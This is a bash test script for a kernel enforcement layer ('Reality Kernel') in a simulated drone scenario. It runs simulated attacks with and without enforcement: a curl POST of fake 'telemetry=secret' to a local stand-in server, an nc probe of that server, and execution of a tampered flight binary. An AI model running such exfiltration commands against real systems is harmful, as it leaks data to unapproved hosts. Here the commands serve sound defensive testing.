#!/usr/bin/env bash
# Drone companion-computer scenario for Reality Kernel.
# Each attack is run twice: once WITHOUT enforcement (must succeed, proving the
# test can actually detect something) and once WITH enforcement (must be blocked).
set -uo pipefail
cd "$(dirname "$0")/../.."
ROOT="$PWD"

FAIL=0
mkdir -p results
pass() { echo "PASS: $*"; }
fail() { echo "FAIL: $*"; FAIL=1; }

echo "== Active LSMs: $(cat /sys/kernel/security/lsm)"
grep -q bpf /sys/kernel/security/lsm || { echo "BPF-LSM not active; aborting."; exit 1; }

# ---- Start the simulated drone (flight controller) ----
SITL=ardupilot/build/sitl/bin/arducopter
SITL_ABS="$(cd "$(dirname "$SITL")" && pwd)/$(basename "$SITL")"
"$SITL" --model + --speedup 1 -I0 \
  --defaults ardupilot/Tools/autotest/default_params/copter.parm \
  > /tmp/sitl.log 2>&1 &
SITL_PID=$!
sleep 10

# A local server standing in for an UNAPPROVED server (reachable, so a block is
# meaningful). It speaks just enough HTTP to answer curl's POST; a bare `nc -lk`
# listener never responds, so curl would time out even without enforcement,
# which would make the baseline (no-RK) run fail the "must succeed" check.
python3 - > /tmp/exfil_listener.log 2>&1 <<'PY' &
import http.server
import socketserver


class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        self.rfile.read(length)
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args):
        pass


class Server(socketserver.TCPServer):
    allow_reuse_address = True


with Server(("127.0.0.1", 9999), Handler) as httpd:
    httpd.serve_forever()
PY
LISTENER_PID=$!

for _ in $(seq 1 20); do
  (exec 3<>/dev/tcp/127.0.0.1/9999) 2>/dev/null && { exec 3>&-; break; }
  sleep 0.2
done

# Prepare a tampered copy of the flight binary (simulates a swapped update).
# Appending a byte after the end of the ELF sections does not stop the kernel
# from loading it (the loader only reads the ELF header and program headers),
# so this still executes under the baseline run; Reality Kernel's exec policy
# is keyed on (device, inode) identity, so the tampered copy is a different
# executable from the real one and is denied once enforced, independent of
# whether the file still "looks" runnable.
cp "$SITL" /tmp/arducopter_tampered
printf 'x' >> /tmp/arducopter_tampered
chmod +x /tmp/arducopter_tampered

# WRAP is empty for the baseline run and `rk run --profile drone --` once
# enforcement is on (set below). `timeout` stays outside WRAP so it bounds the
# whole call (including rk run's own connection overhead) without itself being
# the thing whose exec is being tested.
WRAP=()

# Runs a command (optionally `rk run`-wrapped via $WRAP) and echoes exactly
# one of: succeeded | blocked | daemon-down | launch-failed.
#
# Under enforcement, "blocked" means the kernel itself refused the exec:
# rk-cli's error wraps the launcher's own message, and the launcher reports
# a genuine policy denial as "execve failed: errno <N>" specifically
# (rk-agentd/src/launcher.rs, "EPERM here means policy denied the agent's
# first exec") -- NOT every "rk run error: ..." message. The launcher can
# also fail before ever reaching execve (e.g. "chdir failed", a setup
# problem unrelated to the policy decision this scenario is testing), and
# that produces the exact same "rk run error: failed to spawn agent: child
# setup or exec failed: ..." prefix. Conflating the two is a real bug, not a
# hypothetical: it is exactly what made every attack read as a false
# "blocked by Reality Kernel" pass during a run where rk-sensor itself was
# never actually reached for a policy decision. "daemon-down" is likewise
# kept separate (rk-cli failing to even reach the daemon, "rk run: failed to
# connect to rk-sensor daemon: ...", from the earlier `Client::connect`
# error path) -- neither case tests anything about the policy and must never
# be reported as a passing "blocked" result just because the exit code was
# non-zero.
run_and_classify() {
  local out rc
  out=$(timeout 4 "${WRAP[@]}" "$@" 2>&1 >/dev/null)
  rc=$?
  if [ "${#WRAP[@]}" -eq 0 ]; then
    [ "$rc" -eq 0 ] && echo succeeded || echo blocked
    return
  fi
  if grep -q 'execve failed: errno' <<<"$out"; then
    echo blocked
  elif grep -q '^rk run: failed to connect' <<<"$out"; then
    echo daemon-down
  elif grep -q '^rk run error:' <<<"$out"; then
    echo launch-failed
  elif [ "$rc" -eq 0 ]; then
    echo succeeded
  else
    echo blocked
  fi
}

attack_exfil() { run_and_classify curl -s -m 3 http://127.0.0.1:9999/ -d "telemetry=secret"; }

attack_shell() { run_and_classify nc -z 127.0.0.1 9999; }

attack_tamper() {
  if [ "${#WRAP[@]}" -eq 0 ]; then
    # Baseline: bash itself does the exec. 126 means bash could not exec the
    # file at all (not an RK question yet, e.g. a genuinely corrupted
    # binary); anything else means it ran, which is what "succeeded" means
    # here regardless of --help's own exit code.
    local rc
    timeout 4 /tmp/arducopter_tampered --help >/dev/null 2>&1
    rc=$?
    [ "$rc" -ne 126 ] && echo succeeded || echo blocked
  else
    # Enforced: `rk run`'s own first exec is the tampered binary itself, so
    # the same classification as the other two attacks applies directly.
    run_and_classify /tmp/arducopter_tampered --help
  fi
}

# Polls for a process matching the pgrep pattern $1 and, once found, writes
# its /proc/<pid>/cgroup to $2. Meant to be run in the background alongside
# the command being observed; proves the process actually ran inside a
# kernel cgroup bound to rk.slice (the real enforcement boundary) instead of
# assuming `rk run` placed it there.
observe_cgroup() {
  local pattern="$1" out="$2" pid cand
  : > "$out"
  for _ in $(seq 1 300); do
    # `pgrep -f "$pattern"` also matches `rk run`'s own client process --
    # its argv literally contains, e.g., "scenarios/drone/companion.py" as
    # one of rk run's own arguments, and that client process stays in the
    # caller's (ungoverned) cgroup the whole time; only the process the
    # daemon actually spawns is in rk.slice. Disambiguate on comm: the
    # spawned agent's comm is the interpreter itself ("python3"), the
    # client's is "rk".
    for cand in $(pgrep -f "$pattern" 2>/dev/null); do
      if [ "$(cat "/proc/$cand/comm" 2>/dev/null)" = "python3" ]; then
        pid="$cand"
        break
      fi
    done
    if [ -n "${pid:-}" ] && [ -r "/proc/$pid/cgroup" ]; then
      { echo "pid=$pid"; cat "/proc/$pid/cgroup"; } > "$out" 2>/dev/null
      return 0
    fi
    pid=""
    sleep 0.03
  done
}

assert_governed() {   # $1 = cgroup-capture file, $2 = label
  echo "cgroup proof ($2): $(tr '\n' ' ' <"$1" 2>/dev/null || echo '(file missing)')"
  if grep -q 'rk\.slice/' "$1" 2>/dev/null; then
    pass "$2 ran inside rk.slice (governed cgroup, not the host's)"
  else
    fail "$2 was not observed inside rk.slice"
  fi
}

run_attacks() {   # $1 = "expect-success" | "expect-blocked"
  for a in attack_exfil attack_tamper attack_shell; do
    r=$($a)
    case "$r:$1" in
      succeeded:expect-success) pass "$a reachable without enforcement" ;;
      blocked:expect-blocked) pass "$a blocked by Reality Kernel" ;;
      daemon-down:*) fail "$a proves nothing: rk-sensor was not reachable" ;;
      launch-failed:*) fail "$a proves nothing: rk run failed before reaching a policy decision (not an \"execve failed\" denial)" ;;
      *) fail "$a $r (expected ${1#expect-})" ;;
    esac
  done
}

echo "== Baseline: no enforcement"
run_attacks expect-success
python3 scenarios/drone/bench.py baseline-no-rk results/bench-results.jsonl
if timeout 60 python3 scenarios/drone/companion.py | tee -a results/companion-baseline.txt; then pass "companion mission (baseline)"; else fail "companion mission (baseline)"; fi

# ---- Enable Reality Kernel ----
# Not the default /var/log/rk/audit and /var/lib/rk/audit.key: with --rw (see
# the workflow), those are now real paths on the actual runner host rather
# than an ephemeral VM-local overlay, and writing to them failed outright
# ("audit log disabled: cannot open it ... Permission denied (os error 13)",
# confirmed in rk-sensor's own log on the run that first used --rw). rk-sensor
# takes --audit-dir/--audit-key as first-class flags for exactly this; point
# them at $ROOT, which every other part of this scenario has already proven
# writable, rather than depending on this specific host's /var permissions.
AUDIT_DIR="$ROOT/audit"
AUDIT_KEY="$ROOT/audit.key"
STATE_FILE=/tmp/rk-engine-state.json
POLICY_FILE="$ROOT/scenarios/drone/policy.toml.rendered"
sed "s#__ARDUCOPTER_PATH__#$SITL_ABS#" "$ROOT/scenarios/drone/policy.toml" > "$POLICY_FILE"

# RK never runs agents as root (rk-agentd/src/server.rs: "Never run agents as
# root: map root caller to configured service user"): a caller running as
# root (us, here) is mapped to the fixed, non-configurable "nobody" user
# (65534). The checkout tree is not necessarily traversable by that user, so
# every ancestor directory of $ROOT needs to be world-readable/traversable,
# and results/ needs to be world-writable so the enforced benchmark run
# (which writes from inside the governed process) can append to it. Scoped
# to exactly what the agent actually opens or chdirs into -- not a recursive
# chmod of the whole checkout, which would needlessly walk the entire
# ArduPilot source tree and the Rust release build's hundreds of thousands
# of intermediate build-script artifacts under target/.
p="$ROOT"
while [ "$p" != "/" ]; do chmod o+rx "$p" 2>/dev/null || true; p="$(dirname "$p")"; done
chmod -R o+rX "$ROOT/scenarios"
chmod o+rx "$ROOT/ardupilot" "$ROOT/ardupilot/build" "$ROOT/ardupilot/build/sitl" "$ROOT/ardupilot/build/sitl/bin"
chmod o+r "$SITL_ABS"
# Directory write alone is not enough: results/bench-results.jsonl already
# exists (the baseline bench.py run above, as root, just created it), and
# opening an EXISTING file for append needs write permission on the file
# itself, not just "can create new entries in this directory".
chmod o+w results results/bench-results.jsonl 2>/dev/null || true

# Verify the fix actually worked instead of hoping it did: runs 1 and (after
# an unrelated detour through --rw and back) 5-6 all hit the exact same
# "chdir failed" from the service user, with no code change to this loop in
# between that would explain it reappearing -- something about this
# specific host/run's directory permissions is not fully understood yet. Test
# the real access path (chdir as uid 65534, the actual service user) directly
# here, before ever starting rk-sensor, so a failure is caught with a precise
# diagnostic instead of being inferred later from an opaque launcher error.
if command -v setpriv >/dev/null 2>&1 && setpriv --reuid=65534 --regid=65534 --clear-groups -- sh -c "cd '$ROOT'" 2>/dev/null; then
  pass "verified: uid 65534 (nobody) can chdir into \$ROOT after the permission fix"
else
  fail "uid 65534 (nobody) still cannot chdir into \$ROOT after the permission fix -- diagnostic follows"
  command -v namei >/dev/null 2>&1 && namei -l "$ROOT" 2>&1 || {
    p="$ROOT"
    while [ "$p" != "/" ]; do stat -c '%A %U:%G %n' "$p" 2>&1; p="$(dirname "$p")"; done
    stat -c '%A %U:%G %n' / 2>&1
  }
fi

mkdir -p /sys/fs/cgroup/rk.slice 2>/dev/null || true
rk-sensor --policy "$POLICY_FILE" --state-file "$STATE_FILE" \
  --audit-dir "$AUDIT_DIR" --audit-key "$AUDIT_KEY" > /tmp/rk-sensor.log 2>&1 &
RK_SENSOR_PID=$!

ready=0
for _ in $(seq 1 30); do
  if rk status >/dev/null 2>&1; then ready=1; break; fi
  sleep 1
done
if [ "$ready" -eq 1 ]; then
  pass "rk-sensor started and accepting connections"
else
  fail "rk-sensor did not come up"
  tail -n 60 /tmp/rk-sensor.log
fi
rk status || true

WRAP=(rk run --profile drone --)

echo "== Legitimate mission must still work"
observe_cgroup "scenarios/drone/companion.py" /tmp/cgroup-companion.txt &
OBS_PID=$!
if timeout 60 "${WRAP[@]}" python3 scenarios/drone/companion.py | tee -a results/companion-enforced.txt; then pass "companion mission"; else fail "companion mission"; fi
wait "$OBS_PID" 2>/dev/null
assert_governed /tmp/cgroup-companion.txt "companion.py"

observe_cgroup "scenarios/drone/bench.py" /tmp/cgroup-bench.txt &
OBS_PID=$!
"${WRAP[@]}" python3 scenarios/drone/bench.py enforced-rk results/bench-results.jsonl
wait "$OBS_PID" 2>/dev/null
assert_governed /tmp/cgroup-bench.txt "bench.py"

echo "== Attacks with enforcement"
run_attacks expect-blocked

# All three attacks above are denied at the exec layer (curl/nc/the tampered
# binary are not in the allowlist at all), so none of them ever reach the
# connect hook -- the network policy's own deny path is never independently
# exercised by them. Prove it separately: python3 IS allowed to exec, so this
# tests whether the connect hook on its own still denies the unapproved
# destination, rather than that showing up as a connect4.deny count of zero
# and assuming (wrongly) that enforcement is broken.
echo "== Independent network-layer check (python3 itself is allowed; this destination is not)"
NET_CHECK=$(timeout 4 "${WRAP[@]}" python3 -c '
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)
try:
    s.connect(("127.0.0.1", 9999))
    print("CONNECTED")
except OSError as e:
    print(f"DENIED: {e}")
' 2>&1)
echo "$NET_CHECK"
if grep -q 'DENIED' <<<"$NET_CHECK"; then
  pass "network layer independently denies an allowed binary connecting to the unapproved port"
else
  fail "network layer did not deny an allowed binary's connection to the unapproved port: $NET_CHECK"
fi

echo "== Pipeline decision counters after the attacks (not just pass/fail)"
curl -s http://127.0.0.1:9464/metrics > /tmp/metrics.txt || true
grep '^rk_decisions_total' /tmp/metrics.txt || echo "(no rk_decisions_total lines found)"
metric() {   # $1 = hook, $2 = verdict
  grep -F "rk_decisions_total{hook=\"$1\",verdict=\"$2\"}" /tmp/metrics.txt | awk '{print $NF}'
}
exec_deny=$(metric exec deny); exec_deny=${exec_deny:-0}
connect4_deny=$(metric connect4 deny); connect4_deny=${connect4_deny:-0}
connect4_allow=$(metric connect4 allow); connect4_allow=${connect4_allow:-0}
echo "exec.deny=$exec_deny connect4.deny=$connect4_deny connect4.allow=$connect4_allow"
[ "$exec_deny" -ge 2 ] 2>/dev/null && pass "exec.deny >= 2 ($exec_deny: tampered binary, curl, nc each denied exec)" || fail "exec.deny < 2 ($exec_deny)"
[ "$connect4_deny" -ge 1 ] 2>/dev/null && pass "connect4.deny >= 1 ($connect4_deny)" || fail "connect4.deny < 1 ($connect4_deny)"
[ "$connect4_allow" -gt 0 ] 2>/dev/null && pass "connect4.allow > 0 ($connect4_allow): the companion's 127.0.0.1:5760 connection (and bench.py's :7000) were allowed, not just denials happened" || fail "connect4.allow == 0 ($connect4_allow)"

echo "== Verifying Reality Kernel's signed, hash-chained audit log against its pinned signing key"
# Self-referential verification ("whatever key signed it") only proves the
# chain is internally consistent, not that it was signed by the key this
# deployment actually generated. Pin the real public key the daemon wrote on
# its first start (rk-audit/src/key.rs: AuditKey::load_or_create publishes
# the public half at `<key>.pub`) instead.
AUDIT_PUBKEY="$AUDIT_KEY.pub"
for _ in $(seq 1 20); do [ -s "$AUDIT_PUBKEY" ] && break; sleep 0.2; done
if [ -s "$AUDIT_PUBKEY" ]; then
  echo "pinning audit signing key: $(cat "$AUDIT_PUBKEY")"
else
  fail "audit public key never appeared at $AUDIT_PUBKEY"
fi
# The writer seals a batch once it is older than its batch_interval (default
# 1s, checked opportunistically as events are consumed); give it a moment so
# the most recent decisions are actually sealed before verifying.
sleep 3
if rk audit verify --dir "$AUDIT_DIR" --pubkey "$AUDIT_PUBKEY"; then
  pass "audit chain verifies against the pinned signing key"
else
  fail "audit chain did not verify against the pinned signing key"
  rk audit tail --dir "$AUDIT_DIR" -n 0 || true
fi

echo "== Diagnostics (printed directly; artifact upload of these paths is unconfirmed under virtme-ng)"
ls -la "$ROOT/results" 2>&1 || true
for f in results/bench-results.jsonl results/companion-baseline.txt results/companion-enforced.txt \
         /tmp/sitl.log /tmp/exfil_listener.log /tmp/rk-sensor.log; do
  echo "--- $f ---"
  cat "$f" 2>&1 || true
done

kill "$SITL_PID" "$LISTENER_PID" "$RK_SENSOR_PID" 2>/dev/null
[ "$FAIL" -eq 0 ] && echo "ALL CHECKS PASSED" || { echo "SOME CHECKS FAILED"; exit 1; }
